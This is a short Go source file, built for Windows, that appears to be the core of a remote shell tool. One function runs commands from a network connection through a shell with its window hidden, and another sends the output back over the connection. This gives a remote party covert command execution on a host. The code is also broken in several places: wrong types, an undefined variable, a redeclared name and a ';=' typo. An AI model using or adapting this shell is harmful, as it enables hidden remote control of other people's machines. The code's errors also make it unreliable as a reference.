// +build windows

package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
)

func RCE(shell string, cmd []bytes) ([]bytes) {
	cmd := exec.Command(shell, "-c", string(buf))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, _ := cmd.CombinedOutput()
	return output
}

func DumbShell(shell string, conn net.Conn) {
	reader := bufio.NewReader(conn)

	for {
		stdin, err := reader.ReadBytes('\n')
		if err != nil {
			conn.Close()
			break
		}

		output ;= RCE(shell, stdin)
		conn.Write(output)
	}
}
